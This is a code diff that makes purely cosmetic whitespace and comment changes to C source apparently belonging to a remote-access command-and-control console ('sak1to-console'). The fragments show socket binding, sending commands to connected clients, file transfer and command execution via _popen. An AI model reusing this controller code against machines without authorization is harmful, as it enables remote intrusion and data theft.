@@ -63,6 +63,7 @@ void bind_socket(SOCKET listen_socket, int port) {
 	// Create hint structure.
 	struct sockaddr_in hint;
 	hint.sin_family = AF_INET;
+
 	hint.sin_port = htons(port);
 	hint.sin_addr.S_un.S_addr = INADDR_ANY;
 
@@ -127,6 +128,7 @@ size_t get_line(char* buf) {
 
 	buf[cmd_len++] = '0';
 	c = getchar();
+
 	while (c != '\n' && cmd_len < BUFLEN) {
 		buf[cmd_len++] = c;
 		c = getchar();
@@ -174,6 +176,7 @@ int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 
 	uint32_t bytes = 0;
 	size_t f_size = 0;
+
 	if (fd) {
 		// Get file size.
 		fseek(fd, 0L, SEEK_END);
@@ -187,9 +190,10 @@ int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 	if (!send(client_socket, (char*)&bytes, sizeof(bytes), 0))
 		return SOCKET_ERROR;
 
-	// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 	int iResult = 1;
+
 	if (f_size) {
+		// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
 		int bytes_read;
 		while (!feof(fd) && iResult > 0) {
 			if (bytes_read = fread(buf, 1, BUFLEN, fd)) {
@@ -211,6 +215,7 @@ int send_file(char* buf, size_t cmd_len, SOCKET client_socket) {
 inline uint32_t ntohl_conv(char const* num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
+
 	// Return deserialized bytes.
 	return ntohl(new);
 }
@@ -312,12 +317,13 @@ void interact(Conn_array* conns, char* buf, int client_id) {
 	char* client_host = conns->clients[client_id].host;
 
 	int iResult = 1;
+
 	// Receive and parse input/send commands to client.
 	while (iResult > 0) {
 		printf("%s // ", client_host);
-
 		// Set all bytes in buffer to zero.
 		memset(buf, '\0', BUFLEN);
+
 		size_t cmd_len = get_line(buf);
 		char* cmd = &buf[1];
 
@@ -348,8 +354,8 @@ void interact(Conn_array* conns, char* buf, int client_id) {
 void exec_cmd(char* buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	FILE* fpipe = _popen(buf, "r");
-
 	fseek(fpipe, 0, SEEK_END);
+
 	size_t cmd_len = ftell(fpipe);
 	fseek(fpipe, 0, SEEK_SET);
 
@@ -370,16 +376,16 @@ void exec_cmd(char* buf) {
 // Function for parsing console input.
 void sakito_console(Conn_array* conns) {
 	HANDLE  hColor;
-	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
 
+	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
 	SetConsoleTextAttribute(hColor, 9);
 
 	// Parse/execute sakito-console input.
 	while (1) {
 		printf("sak1to-console // ");
-
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
 		char buf[BUFLEN + 1] = { 0 };
+	
 		size_t cmd_len = get_line(buf);
 		char* cmd = &buf[1];
 
